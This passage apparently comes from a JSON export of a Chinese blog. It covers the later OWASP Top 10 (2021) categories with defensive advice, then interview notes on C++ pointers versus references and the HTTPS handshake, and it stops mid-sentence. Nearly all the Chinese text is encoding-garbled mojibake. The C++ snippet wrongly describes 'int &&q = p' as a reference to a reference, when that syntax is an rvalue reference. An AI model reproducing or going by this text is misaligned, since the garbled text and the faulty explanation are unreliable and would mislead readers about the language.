ï¼Œç°åœ¨ä¸Šå‡äº†ä¸€ä½ã€‚éšç€è½¯ä»¶çš„å¯é…ç½®æ€§é€æ¸å˜å¼ºï¼Œè¿™ä¸€å®‰å…¨é—®é¢˜çš„åŠ å‰§ä¹Ÿå°±ä¸è¶³ä¸ºå¥‡äº†ã€‚\nåº”ç”¨ä¸­å¸¸è§çš„ä¸å®‰å…¨é…ç½®æœ‰ï¼š\näº‘æœåŠ¡ä¸­çš„æƒé™é…ç½®é”™è¯¯ï¼› å®‰è£…æˆ–å¯ç”¨äº†ä¸å¿…è¦çš„ç‰¹æ€§ï¼ˆå¦‚éå¿…è¦çš„æœåŠ¡ã€ç«¯å£ã€é¡µé¢ã€è´¦å·ï¼‰ï¼› ä»åœ¨ä½¿ç”¨é»˜è®¤çš„è´¦å·æˆ–å¯†ç ï¼› æŠŠåº”ç”¨çš„æŠ¥é”™ä¿¡æ¯æ³„éœ²ç»™äº†ç”¨æˆ·ï¼› ç³»ç»Ÿå‡çº§ä¹‹åæ²¡æœ‰åŠæ—¶å¯ç”¨æ–°çš„å®‰å…¨ç‰¹æ€§ï¼› æ²¡æœ‰åœ¨å¼€å‘/æœåŠ¡æ¡†æ¶ä¸­é…ç½®å¥½å®‰å…¨å±æ€§ï¼› æœåŠ¡ç«¯æ²¡æœ‰å‘å®¢æˆ·ç«¯å‘é€å®‰å…¨ç›¸å…³çš„æŒ‡ä»¤æˆ–æ¶ˆæ¯å¤´ï¼› ä½¿ç”¨äº†ä¸å®‰å…¨çš„ç»„ä»¶ã€‚ é˜²æŠ¤æªæ–½ ï¼š\nå®æ–½å®‰å…¨çš„å®‰è£…è¿‡ç¨‹ï¼Œå¦‚å¼€å‘ã€æµ‹è¯•ã€ç”Ÿäº§ç¯å¢ƒä¸­ä¿æŒç›¸åŒå®‰å…¨é…ç½®ï¼Œä¸”å£ä»¤ä¸åŒã€‚å®‰è£…è¿‡ç¨‹å°½é‡è‡ªåŠ¨åŒ–ï¼Œä»¥å‡å°å‡ºé”™çš„å¯èƒ½ã€‚ æ­å»ºæœ€å°åŒ–å¹³å°ï¼Œç§»é™¤æ‰€æœ‰ä¸å¿…è¦çš„åŠŸèƒ½ã€ç»„ä»¶ã€æ–‡ä»¶åŠç¤ºä¾‹ã€‚ æ£€æŸ¥å’Œä¿®å¤å®‰å…¨é…ç½®é¡¹æ¥é€‚åº”æœ€æ–°çš„å®‰å…¨è¯´æ˜ã€æ›´æ–°å’Œè¡¥ä¸ï¼Œå¹¶å°†å…¶ä½œä¸ºæ›´æ–°ç®¡ç†è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚æ£€æŸ¥è¿‡ç¨‹ä¸­ï¼Œç‰¹åˆ«æ³¨æ„äº‘å­˜å‚¨çš„æƒé™ã€‚ å‘å®¢æˆ·ç«¯å‘é€å®‰å…¨æŒ‡ä»¤ï¼Œå¦‚å®‰å…¨æ ‡å¤´ï¼ˆæƒ³åˆ°äº†CSPã€HTTP-Onlyï¼‰ã€‚ 6 Vulnerable and Outdated Components å­˜åœ¨æ¼æ´çš„æˆ–è¿‡æ—¶çš„ç»„ä»¶ æ—§ç§° ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶ ï¼ŒåŸæ¦œå•æ’ç¬¬ä¹ã€‚åœ¨è¡Œä¸šè°ƒæŸ¥ä¸­ï¼Œè¿™ä¸€å®‰å…¨é—®é¢˜æ”¶åˆ°äº† ç¬¬äºŒå¤š çš„åé¦ˆã€‚\nè¿™ä¸€é—®é¢˜ä¸€èˆ¬å‡ºç°åœ¨ï¼š\nå¯¹è‡ªå·±ä½¿ç”¨çš„ç»„ä»¶æˆ–ä¾èµ–çš„ç»„ä»¶çš„ç‰ˆæœ¬æ²¡æœ‰æ¸…æ™°çš„è®¤çŸ¥ï¼› ä¾èµ–çš„ç»„ä»¶æˆ–è¿è¡Œç¯å¢ƒå­˜åœ¨æ¼æ´æˆ–è¿‡æ—¶ï¼ˆå¦‚OSã€DBMSç­‰ï¼‰ï¼› æ²¡æœ‰å®šæœŸè¿›è¡Œç»„ä»¶çš„æ¼æ´æ£€æµ‹ï¼Œæ²¡æœ‰å…³æ³¨ç»„ä»¶å¼€å‘è€…å‘å¸ƒçš„å®‰å…¨å…¬å‘Šï¼› æ²¡æœ‰ä¿®å¤æˆ–å‡çº§åº•å±‚ä¾èµ–ï¼› æ²¡æœ‰å¯¹æ–°ç»„å»ºçš„é€‚é…æ€§è¿›è¡Œæµ‹è¯•ï¼› æ²¡æœ‰å¯¹ç»„ä»¶è¿›è¡Œå¦¥å–„çš„å®‰å…¨é…ç½®ï¼ˆè§ä¸Šä¸€ä¸ªé—®é¢˜ï¼‰ã€‚ é˜²æŠ¤æªæ–½ ï¼š\nç§»é™¤ä¸ä½¿ç”¨çš„ä¾èµ–ã€ä¸éœ€è¦çš„åŠŸèƒ½ã€ç»„ä»¶ã€æ–‡æ¡£ã€‚ åˆ©ç”¨å„ç§å·¥å…·æ¥æŒç»­è®°å½•å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä»¥åŠå®ƒä»¬çš„ä¾èµ–åº“çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚æŒç»­ç›‘æ§CVEç­‰ä¿¡æ¯æ¥åˆ¤æ–­å·²æœ‰ç»„ä»¶æ˜¯å¦æœ‰æ¼æ´ã€‚ ä½¿ç”¨å®˜æ–¹æ¸ é“å®‰å…¨åœ°è·å–ç»„ä»¶ï¼Œå¹¶ä½¿ç”¨ç­¾åæœºåˆ¶æ¥é™ä½ç»„ä»¶è¢«ç¯¡æ”¹æˆ–åŠ å…¥æ¶æ„æ¼æ´çš„é£é™©ã€‚ ç›‘æ§é‚£äº›ä¸å†ç»´æŠ¤æˆ–ä¸å‘å¸ƒå®‰å…¨è¡¥ä¸çš„åº“å’Œç»„ä»¶ã€‚ 7 Identification and Authentication Failures èº«ä»½è®¤è¯å’Œæˆæƒå¤±è´¥ æ—§ç§° å¤±æ•ˆçš„èº«ä»½è®¤è¯ ï¼Œç”±åŸæ¦œ No. 2 ä¸‹æ»‘åˆ°ç¬¬7ä½ã€‚\nå¯¹ç”¨æˆ·èº«ä»½çš„è®¤è¯å’Œæˆæƒæ˜¯éå¸¸å…³é”®çš„è¿‡ç¨‹ï¼Œå‡å¦‚åº”ç”¨ä¸­å­˜åœ¨å¦‚ä¸‹çš„é—®é¢˜ï¼Œåˆ™å¯èƒ½å¯¼è‡´è®¤è¯æœºåˆ¶çš„å¤±æ•ˆï¼š\nä¸å¯¹æš´åŠ›ç ´è§£æˆ–å…¶ä»–è‡ªåŠ¨åŒ–çš„èº«ä»½è®¤è¯æ”»å‡»è¿›è¡Œé˜²å¾¡ï¼› å…è®¸å¼±å£ä»¤çš„å­˜åœ¨ï¼› ä½¿ç”¨ä¸å®‰å…¨çš„å£ä»¤æ‰¾å›æœºåˆ¶ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥è·å–æˆ–é‡ç½®ç”¨æˆ·å£ä»¤ï¼› ä½¿ç”¨æ˜æ–‡æˆ–ä¸å®‰å…¨çš„å¯†ç å“ˆå¸Œç®—æ³•ï¼ˆè§æ—§ç‰ˆ æ•æ„Ÿæ•°æ®æ³„éœ² æˆ–æ–°ç‰ˆ å¯†ç ç®—æ³•å¤±æ•ˆ ï¼‰ï¼› æ²¡æœ‰ä½¿ç”¨æˆ–ä½¿ç”¨äº†è„†å¼±çš„å¤šå› ç´ è®¤è¯ï¼› æ²¡æœ‰å¦¥å–„å¤„ç†ä¼šè¯IDã€‚åŒ…æ‹¬ï¼šåœ¨URLä¸­æš´éœ²äº†ä¼šè¯IDï¼Œæˆ–ç”¨æˆ·ç™»å½•ä¹‹åæ²¡æœ‰ç”Ÿæˆæ–°çš„ä¼šè¯IDï¼Œæˆ–ç”¨æˆ·æ³¨é”€ä¹‹åæ²¡æœ‰åŠæ—¶é”€æ¯ä¼šè¯IDã€‚ é˜²æŠ¤æªæ–½ ï¼š\nå¤šå› ç´ èº«ä»½è®¤è¯ã€‚ å¼±å£ä»¤æ£€æŸ¥ã€‚ ç»Ÿä¸€æ³¨å†Œã€å‡­æ®æ¢å¤ç­‰æ¥å£ï¼Œé˜²æ­¢ç”¨æˆ·æšä¸¾æ”»å‡»ã€‚ ä¼šè¯IDçš„åˆç†ç®¡ç†ï¼Œå¦‚ç™»å½•ä¹‹åç”Ÿæˆé«˜åº¦éšæœºçš„ä¼šè¯IDã€å¦¥å–„å­˜å‚¨ï¼ˆè‚¯å®šä¸èƒ½å‡ºç°åœ¨URLé‡Œâ€¦â€¦ï¼‰ã€ç™»å‡ºä¹‹ååŠæ—¶é”€æ¯ã€‚ 8 Software and Data Integrity Failures æ–°ç±»åˆ«~\næˆ‘ä»¬ç»å¸¸èƒ½é‡åˆ°ä¸€äº›ä¸è½¯ä»¶æ›´æ–°æˆ–æŸéƒ¨åˆ†é‡è¦æ•°æ®å¯†åˆ‡ç›¸å…³çš„æ“ä½œï¼Œè€Œå‡å¦‚è¿™äº›æ“ä½œä¸å¯¹è½¯ä»¶å’Œæ•°æ®å®Œæ•´æ€§è¿›è¡ŒéªŒè¯ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯æ—§ç‰ˆæ’å No. 8 çš„é—®é¢˜â€”â€”ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œå®ƒå®é™…ä¸Šå±äºè¯¥ç±»åˆ«çš„ä¸€éƒ¨åˆ†ã€‚\nè¯¥é—®é¢˜é€šå¸¸ç”±äºä»£ç æˆ–æ¶æ„ä¸­æ²¡æœ‰å¯¹è½¯ä»¶/æ•°æ®å®Œæ•´æ€§è¿›è¡Œæ£€æŸ¥ï¼Œæ¯”å¦‚ç¨‹åºä¸­ä½¿ç”¨äº†æ¥è‡ªä¸å—ä¿¡æºçš„æ’ä»¶ã€æ¨¡å—æˆ–åº“ã€‚è¿‘å¹´æ¥ï¼Œè®¸å¤šç¨‹åºéƒ½é›†æˆäº†è‡ªåŠ¨æ›´æ–°åŠŸèƒ½ï¼Œè¿™äº›æ›´æ–°å†…å®¹è¢«ä¸‹è½½ä¹‹åæ²¡æœ‰è¿›è¡Œå‘¨åˆ°çš„å®Œæ•´æ€§æ£€æŸ¥ï¼Œå°±è¢«åº”ç”¨åœ¨äº†åŸæœ¬å—ä¿¡çš„ç¨‹åºä¸Šï¼›æ”»å‡»è€…å¯èƒ½ä¼šå‘å¸ƒä¸€ä¸ªæ¶æ„æ›´æ–°ï¼Œå¹¶ä½¿å¾—è¿™äº›æ›´æ–°è¢«æ‰€æœ‰å®‰è£…äº†åŸç¨‹åºçš„æœºå™¨è¿è¡Œã€‚\né˜²æŠ¤æªæ–½ ï¼š\nä½¿ç”¨æ•°å­—ç­¾åæˆ–å…¶ä»–ç±»ä¼¼çš„æœºåˆ¶æ¥ä¿è¯è½¯ä»¶æˆ–æ•°æ®çš„æ¥æºæ˜¯å¯ä¿¡çš„ï¼Œä¸”ä¼ è¾“è¿‡ç¨‹ä¸­å¹¶æœªå—åˆ°ç¯¡æ”¹ï¼› ç¡®ä¿ä½ ä½¿ç”¨çš„ç®¡ç†å’Œæ„å»ºå·¥å…·ï¼ˆå¦‚Mavenï¼‰æ˜¯ä»å¯ä¿¡çš„ä»“åº“ä¸‹è½½ä¾èµ–ï¼› ä½¿ç”¨è½¯ä»¶ä¾›åº”é“¾å®‰å…¨æ£€æŸ¥å·¥å…·ï¼Œå¦‚ OWASP Dependency Check æˆ– OWASP CycloneDX ï¼Œæ¥ç¡®ä¿é¡¹ç›®ä½¿ç”¨çš„ç»„ä»¶ä¸­æ²¡æœ‰å·²çŸ¥æ¼æ´ï¼› å»ºç«‹ä¸€ä¸ª review æœºåˆ¶æ¥å¯¹ä»£ç æˆ–é…ç½®çš„å˜æ›´è¿›è¡Œå®¡æŸ¥ï¼Œé˜²æ­¢ä¸å®‰å…¨çš„å˜æ›´è¢«å¼•å…¥é¡¹ç›®æµæ°´çº¿ä¸­ï¼› ä¸è¦å°†æœªç­¾åæˆ–æœªåŠ å¯†çš„åºåˆ—åŒ–æ•°æ®å‘é€ç»™ä¸å—ä¿¡çš„å®¢æˆ·ç«¯ï¼Œé˜²æ­¢æ¶æ„å®¢æˆ·ç«¯ç¯¡æ”¹æˆ–é‡æ”¾åºåˆ—åŒ–æ•°æ®ã€‚ 9 Security Logging and Monitoring Failures æ—¥å¿—å’Œç›‘æ§ä¸è¶³ ç”±åŸç‰ˆç¬¬åä½ä¸Šå‡æ¥åˆ°ç¬¬ä¹ä½ã€‚æ—¥å¿—å’Œå®¡è®¡æ•°æ®çš„é‡è¦æ€§ä¸è¨€è€Œå–»ï¼Œå®ƒä»¬æ˜¯æ”»å‡»æº¯æºã€è´¦å·å®¡è®¡ã€å‘Šè­¦å’Œå“åº”ç­‰å®‰å…¨åŠŸèƒ½çš„é‡è¦ä¾èµ–ã€‚\næ—¥å¿—å’Œç›‘æ§ä¸è¶³çš„é—®é¢˜ä¸€èˆ¬å¯èƒ½å‘ç”Ÿåœ¨å¦‚ä¸‹çš„åœºæ™¯ï¼š\næœ‰äº›äº‹ä»¶åº”è¢«å®¡è®¡ï¼Œä½†å¹¶æœªè¢«å®¡è®¡ï¼ˆå¦‚ç™»å½•æˆåŠŸã€ç™»å½•å¤±è´¥ï¼‰ï¼› ç³»ç»Ÿç¡®å®äº§ç”Ÿäº†å‘Šè­¦æˆ–æŠ¥é”™ï¼Œä½†æ˜¯è¿™äº›æ¶ˆæ¯å‘ˆç°çš„ä¿¡æ¯ä¸å¤Ÿæ¸…æ™°ï¼› åº”ç”¨æ—¥å¿—å’ŒAPIæ—¥å¿—æ²¡æœ‰å—åˆ°å®æ—¶çš„ç›‘æ§ï¼Œç”±æ­¤ä¸èƒ½åŠæ—¶å‘ç°å¯ç–‘è¡Œä¸ºï¼› æ—¥å¿—æ²¡æœ‰å¦¥å–„å­˜å‚¨ï¼› å‘Šè­¦é˜ˆå€¼å’Œå“åº”å¯åŠ¨çš„è¿‡ç¨‹æ²¡æœ‰è®¾ç½®åˆ°ä½ï¼› æ¸—é€æµ‹è¯•æˆ–æ‰«æå·¥å…·å‘èµ·çš„æ‰«æè¡Œä¸ºæ²¡èƒ½è§¦å‘å‘Šè­¦ï¼› ç¨‹åºä¸èƒ½å¤Ÿå¯¹æ”»å‡»è¡Œä¸ºè¿›è¡Œå®æ—¶æˆ–åŠæ—¶çš„å‘Šè­¦ã€å“åº”ã€å¤„ç½®ã€‚ å¯¹äºè¿™äº›æ—¥å¿—å’Œç›‘æ§ä¿¡æ¯ï¼Œæœ€å¥½è¿˜è¦åˆ¶å®šé€‚å½“çš„è®¿é—®æ§åˆ¶æƒé™ï¼Œå¦åˆ™ä¹Ÿå¯èƒ½å­˜åœ¨é£é™©ã€‚\né˜²æŠ¤æªæ–½ ï¼š\nç¡®ä¿æ‰€æœ‰ç™»å½•ã€è®¿é—®æ§åˆ¶å’ŒæœåŠ¡ç«¯çš„è¾“å…¥éªŒè¯å¤±è´¥ä¿¡æ¯éƒ½å—åˆ°äº†è®°å½•ï¼Œä¸”è¿™äº›è®°å½•éœ€è¦å¸¦æœ‰å®Œæ•´çš„ç”¨æˆ·ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œä»¥å®šä½å¯ç–‘è´¦å·ï¼›åŒæ—¶ï¼Œè¿™äº›è®°å½•è¦å­˜ç•™è¶³å¤Ÿé•¿çš„äº‹ä»¶ï¼Œä»¥ä¾¿åç»­çš„åˆ†æï¼› ç¡®ä¿æ—¥å¿—æ ¼å¼æ˜“äºå¤„ç†ï¼Œå°¤å…¶æ˜¯è®©è‡ªåŠ¨åŒ–çš„æ—¥å¿—ç®¡ç†å·¥å…·å¤„ç†ï¼ˆå®£ä¼ ä¸€æ³¢TxSOCï¼‰ï¼› ç¡®ä¿æ—¥å¿—æ•°æ®è¢«æ­£ç¡®åœ°ç¼–ç ï¼Œé˜²æ­¢é’ˆå¯¹æ—¥å¿—å’Œç›‘æ§ç³»ç»Ÿçš„æ³¨å…¥æ”»å‡»ï¼› ç¡®ä¿é«˜é¢äº¤æ˜“æœ‰å®Œæ•´æ€§æ§åˆ¶çš„å®¡è®¡ä¿¡æ¯ï¼Œä¸”å®¡è®¡ä¿¡æ¯å¿…é¡»é˜²æ­¢ç¯¡æ”¹æˆ–åˆ é™¤ï¼› åˆ¶å®šåº”æ€¥ç®¡ç†é¢„æ¡ˆï¼Œä¿éšœäº‹ä»¶çš„æœ‰åºå“åº”å’Œæ¢å¤ã€‚ 10 Server Side Request Forgeryï¼ˆSSRFï¼‰ OHHHHHHHH\né¢è¯•å¸¸å®¢äº†ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸šç•Œåé¦ˆç¬¬ä¸€é«˜çš„é—®é¢˜ï¼Œä½†åœ¨è¿™ä¸€è½®çš„æµ‹è¯•è¿‡ç¨‹ä¸­æ²¡æœ‰å‡ºç°å¾ˆå¹¿æ³›çš„SSRFé—®é¢˜ã€‚è¿™ç§æ–°æ¡ç›®è¦†ç›–çš„é¢ä¸€èˆ¬è¾ƒå°ï¼Œä¸»è¦æ˜¯ä¸ºäº†å¼•èµ·äººä»¬çš„å…³æ³¨å’Œè®¤çŸ¥ï¼Œåç»­å¯èƒ½æ‰©å¤§æˆæ›´å¹¿ä¸€ç‚¹çš„ç±»åˆ«ã€‚\nå½“ä¸€ä¸ªç½‘ç«™åç«¯ä½¿ç”¨ç”¨æˆ·æä¾›çš„URLæ¥è·å–è¿œç¨‹èµ„æºï¼Œä¸”æœªå¯¹è¿™ä¸€URLè¿›è¡Œæ£€æŸ¥æ—¶ï¼Œå°±å¯èƒ½å‘ç”ŸSSRFã€‚è¿™ä¸€æ¼æ´ä½¿å¾—åç«¯æœåŠ¡å™¨è¢«æ”»å‡»è€…ç”¨æ¥å‘æˆ‘ä»¬ä¸å¸Œæœ›çš„ç›®æ ‡å‘é€æ¶æ„è¯·æ±‚ï¼Œä¸”è¿™ç§è¯·æ±‚å¯ä»¥ç»•è¿‡WAFã€VPNå’Œå…¶ä»–ç±»å‹çš„ACLã€‚\nå½“å‰çš„Webåº”ç”¨éƒ½åœ¨å‘ç”¨æˆ·æä¾›è¶Šæ¥è¶Šå¤šçš„æ–¹ä¾¿åŠŸèƒ½ï¼ŒåŒ…æ‹¬ä»ç”¨æˆ·ä¾§è·å–URLï¼Œè¿™ä½¿å¾—SSRFçš„å‡ºç°æ¦‚ç‡åœ¨ä¸æ–­å¢åŠ ï¼›åŒæ—¶ï¼Œéšç€äº‘è®¡ç®—çš„å‘å±•å’Œç¨‹åºæ¶æ„çš„å¤æ‚åŒ–ï¼ŒSSRFçš„ä¸¥é‡æ€§ä¹Ÿåœ¨ä¸æ–­å¢åŠ ã€‚\né˜²æŠ¤æªæ–½ ï¼š\nç½‘ç»œå±‚\nå¯¹å†…ç½‘è¿›è¡Œåˆ’åˆ†ï¼Œå°¤å…¶æ˜¯å…·æœ‰è¿œç¨‹èµ„æºè®¿é—®åŠŸèƒ½çš„éƒ¨åˆ†ï¼Œä»¥å‡è½»SSRFå¸¦æ¥çš„å½±å“ï¼› é˜²ç«å¢™ä¸Šé…ç½®â€œé»˜è®¤æ‹’ç»â€çš„è§„åˆ™ï¼Œåªæ”¾è¡Œä¸€äº›å¿…è¦çš„è¯·æ±‚ï¼› åº”ç”¨å±‚\næ£€æŸ¥æ¥è‡ªå®¢æˆ·ç«¯çš„æ‰€æœ‰è¾“å…¥æ•°æ®ï¼› å¯¹URLæ ¼å¼ã€ç«¯å£å’Œç›®çš„åœ°å€è®¾ç½®ä¸€ä¸ªç™½åå•ï¼› ä¸æŠŠåŸå§‹æ•°æ®è¿”å›ç»™å®¢æˆ·ç«¯ï¼ˆå³è¿œç¨‹è·å–åˆ°çš„èµ„æºè¦è¿›è¡Œå¤„ç†ï¼‰ï¼› ç¦ç”¨HTTPé‡å®šå‘ï¼› ç•™æ„URLçš„æœ‰æ•ˆæ—¶é—´ï¼Œé˜²æ­¢DNSé‡ç»‘å®šæˆ–TOUTOCï¼ˆtime of use, time of checkï¼‰ç«äº‰æ¡ä»¶æ”»å‡»ï¼› ä¸è¦ç”¨é»‘åå•æ¥é˜²æ­¢SSRFï¼Œå› ä¸ºæ”»å‡»è€…æœ‰å¾ˆå¤šç§åŠæ³•ç»•è¿‡å®ƒä»¬ã€‚\n","date":"2021-09-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/owasp-top102021/","title":"OWASP Top10ï¼ˆ2021ï¼‰"},{"content":"2021-07-20ï¼Œæ­£å¼æ‹‰å¼€äº†ç§‹æ‹›å¤‡æˆ˜çš„åºå¹•ã€‚\næˆ‘ä¸€ç›´ä»¥æ¥éƒ½æ·±ä»¥ä¸ºç„¶çš„ä¸€ä¸ªå¥å­æ˜¯ï¼Œäººä¸€èƒ½ä¹‹ï¼Œå·±ç™¾ä¹‹ï¼›äººåèƒ½ä¹‹ï¼Œå·±åƒä¹‹ã€‚æœèƒ½æ­¤é“çŸ£ï¼Œè™½æ„šå¿…æ˜ï¼Œè™½æŸ”å¿…å¼ºã€‚ è¿™ä¸ªå¥å­çš„æ„æ€æ˜¯ï¼Œå¦‚æœä½ çš„å­¦ä¹ èƒ½åŠ›æ¯”ä¸ä¸Šä»–äººï¼Œé‚£å°±èŠ±è´¹ç™¾å€çš„ç²¾åŠ›å»å­¦ï¼Œèƒ½å¤Ÿåšåˆ°è¿™ä¸€ç‚¹çš„äººï¼Œå³ä½¿æ˜¯ä¸€ä¸ªæ„šè€…ï¼Œä¹Ÿèƒ½å¤Ÿæ˜äº†å¾ˆå¤šçš„çŸ¥è¯†ã€‚\n1 C++å¼•ç”¨å’ŒæŒ‡é’ˆçš„åŒºåˆ« è¿™ä¸ªé—®é¢˜å‡ºç°åœ¨æ˜¨å¤©çš„é¢è¯•ä¸­ï¼Œåœ¨æ­¤äºˆä»¥å­¦ä¹ å’Œè®°å½•ã€‚\næŒ‡é’ˆï¼š æŒ‡é’ˆæ˜¯ä¸€ä¸ªå˜é‡ï¼Œç”¨äºä¿å­˜å¦ä¸€ä¸ªå˜é‡çš„åœ°å€ã€‚æŒ‡é’ˆéœ€è¦ä½¿ç”¨ * æ¥è¿›è¡Œè§£å¼•ç”¨ï¼Œä»¥è·å–å®ƒæŒ‡å‘çš„å†…å­˜åœ°å€ä¸Šçš„å†…å®¹ã€‚\nå¼•ç”¨ï¼š å¼•ç”¨æ˜¯ä¸€ä¸ª å·²ç»å­˜åœ¨ çš„å˜é‡çš„åˆ«åï¼Œå®é™…ä¸Šï¼Œå¼•ç”¨ä¹Ÿæ˜¯é€šè¿‡å­˜å‚¨å˜é‡çš„åœ°å€æ¥è¿›è¡Œå®ç°çš„ã€‚\nä¸¤è€…çš„åŒºåˆ«æœ‰å¦‚ä¸‹å‡ ç‚¹ï¼š\nåˆå§‹åŒ–çš„æ–¹å¼ä¸åŒã€‚æŒ‡é’ˆå¯ä»¥å…ˆå£°æ˜ï¼Œåèµ‹å€¼ï¼›å¼•ç”¨å¿…é¡»åœ¨å£°æ˜çš„åŒæ—¶è¿›è¡Œåˆå§‹åŒ–ï¼Œå› ä¸ºå®ƒå¿…é¡»ä½œä¸ºä¸€ä¸ªå·²ç»å­˜åœ¨çš„å˜é‡çš„åˆ«åã€‚\né‡å¤èµ‹å€¼ã€‚æŒ‡é’ˆå¯ä»¥é‡å¤èµ‹å€¼ï¼ˆå½“ç„¶ï¼ŒconstæŒ‡é’ˆä¸è¡Œï¼‰ï¼Œè€Œå¼•ç”¨ä¸€æ—¦å£°æ˜ï¼Œå°±ä¸å¯ä»¥é‡å¤èµ‹å€¼ã€‚\nå†…å­˜å ç”¨ã€‚æŒ‡é’ˆåœ¨æ ˆä¸Šæœ‰å…¶ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼ˆ32bitæœºå™¨å°±å ç”¨4å­—èŠ‚ï¼‰ï¼Œè€Œå¼•ç”¨ä¸å®ƒçš„åˆå§‹å˜é‡å…±äº«åŒä¸€ä¸ªç©ºé—´ï¼Œè™½ç„¶å®ƒè¿˜æ˜¯ä¼šèŠ±æ‰ä¸€éƒ¨åˆ†æ ˆç©ºé—´ã€‚\næ˜¯å¦ä¸ºç©ºã€‚æŒ‡é’ˆå¯ä»¥è®¾ç½®ä¸ºNULLï¼Œè€Œå¼•ç”¨ä¸è¡Œï¼ˆåŸºäºç¬¬ä¸€ç‚¹å’Œç¬¬äºŒç‚¹åŒºåˆ«ï¼‰ã€‚\né—´æ¥å¼•ç”¨ã€‚æŒ‡é’ˆå¯ä»¥æœ‰å¤šé‡åµŒå¥—ï¼Œè€Œå¼•ç”¨ä¸è¡Œã€‚\nIn Pointers, int a = 10; int *p; int **q; //it is valid. p = \u0026amp;a; q = \u0026amp;p; // Whereas in references, int \u0026amp;p = a; int \u0026amp;\u0026amp;q = p; //it is reference to reference, so it is an error. å¯ä»¥ä½¿ç”¨ä¸€å¥è¯æ¥æ¦‚æ‹¬ä¸¤è€…åœ¨å®é™…ä½¿ç”¨ä¸­çš„è§„å¾‹ï¼šåªåœ¨ä¸‡ä¸å¾—å·²çš„æ—¶å€™ä½¿ç”¨æŒ‡é’ˆã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¼•ç”¨ä¼šç”¨åœ¨ä¸€ä¸ªç±»çš„publicæ¥å£ä¸­ï¼Œè€ŒæŒ‡é’ˆè¿ç”¨åœ¨å…¶å†…éƒ¨ã€‚\nä»¥ä¸‹ç¼–è¾‘äº2021-07-25\nä¼ å¼•ç”¨æ¯”ä¼ æŒ‡é’ˆå®‰å…¨ã€‚ å› ä¸ºä¸å­˜åœ¨ç©ºå¼•ç”¨ï¼Œå¹¶ä¸”å¼•ç”¨ä¸€æ—¦è¢«åˆå§‹åŒ–ä¸ºæŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼Œå°±ä¸ä¼šè¢«æ”¹å˜ä¸ºå¦ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼›è€ŒæŒ‡é’ˆå¯èƒ½è¢«æ”¹å˜ä¸ºå¦ä¸€ä¸ªå¯¹è±¡ã€‚\nå³ä½¿å£°æ˜ä¸ºå¸¸é‡æŒ‡é’ˆ const Type* ï¼Œä»å¯èƒ½ä¸ºç©ºæŒ‡é’ˆï¼Œå¹¶ä¸”å¯èƒ½äº§ç”Ÿé‡æŒ‡é’ˆï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸å®‰å…¨ã€‚\nReference\n[1] Pointers vs References in C++ - GeeksforGeeks\n[2] ã€C++ã€‘C++å¸¸è§é¢è¯•é¢˜æ±‡æ€»_æŒç»­æ›´æ–°ä¸­\u0026hellip; - çŸ¥ä¹ (zhihu.com)\n2 HTTPSæµç¨‹ HTTPSçš„æµç¨‹æ€»ç»“ä¸ºå¦‚ä¸‹æ­¥éª¤ï¼š\nå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è‡ªå·±æ”¯æŒçš„å¯†ç å¥—ä»¶ï¼ˆcipher suitï¼‰å’Œä¸€ä¸ªéšæœºæ•° rc ï¼› æœåŠ¡ç«¯é€‰æ‹©ä¸€å¥—å¯†ç ç®—æ³•ï¼Œè¿åŒè‡ªå·±çš„è¯ä¹¦ä¿¡æ¯è¿”å›ç»™å®¢æˆ·ç«¯ã€‚åœ¨è¿™é‡Œï¼ŒæœåŠ¡ç«¯å…·ä½“ä¼šå°†è‡ªå·±çš„å…¬é’¥ã€æ•°å­—è¯ä¹¦ã€ç­¾åä»¥åŠä¸€ä¸ªéšæœºæ•° rs ç­‰ä¿¡æ¯å‘é€ç»™å®¢æˆ·ç«¯ï¼› å®¢æˆ·ç«¯æ¥å—æœåŠ¡ç«¯çš„è¯ä¹¦ä¹‹åï¼Œä¼šæ ¹æ® rc å’Œ rs ç”Ÿæˆä¸€ä¸ªéšæœºçš„å¯¹ç§°ç§˜é’¥ï¼ŒåŒç†ï¼ŒæœåŠ¡å™¨æ­¤æ—¶ä¹Ÿä¼šç”Ÿæˆç›¸åŒçš„å¯¹ç§°ç§˜é’¥ï¼› åŒæ–¹åŠ å¯†é€šä¿¡ã€‚ ä»¥ä¸‹äº2021-07-24é‡ç¼–è¾‘\nè¿˜æœ‰ä¸€ç§å¯¹HTTPSæµç¨‹çš„æè¿°æ˜¯ï¼š\nå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è‡ªå·±æ”¯æŒçš„å¯†ç å¥—ä»¶ï¼ˆcipher suitï¼‰ï¼› æœåŠ¡ç«¯é€‰æ‹©ä¸€å¥—å¯†ç ç®—æ³•ï¼Œè¿åŒè‡ªå·±çš„è¯ä¹¦ä¿¡æ¯è¿”å›ç»™å®¢æˆ·ç«¯ã€‚åœ¨è¿™é‡Œï¼ŒæœåŠ¡ç«¯å…·ä½“ä¼šå°†è‡ªå·±çš„å…¬é’¥ã€æ•°å­—è¯ä¹¦ã€ç­¾åç­‰ä¿¡æ¯å‘é€ç»™å®¢æˆ·ç«¯ï¼› å®¢æˆ·ç«¯æ¥å—æœåŠ¡ç«¯çš„è¯ä¹¦ä¹‹åï¼Œä¼šç”Ÿæˆä¸€ä¸ªéšæœºçš„å¯¹ç§°ç§˜é’¥ï¼Œç”¨æœåŠ¡ç«¯çš„å…¬é’¥åŠ å¯†åå‘é€ç»™æœåŠ¡ç«¯ï¼›æœåŠ¡ç«¯æ”¶åˆ°æ¶ˆæ¯ä¹‹åå¯ä»¥è§£å¯†å¾—åˆ°å¯¹ç§°ç§˜é’¥ï¼› åŒæ–¹åŠ 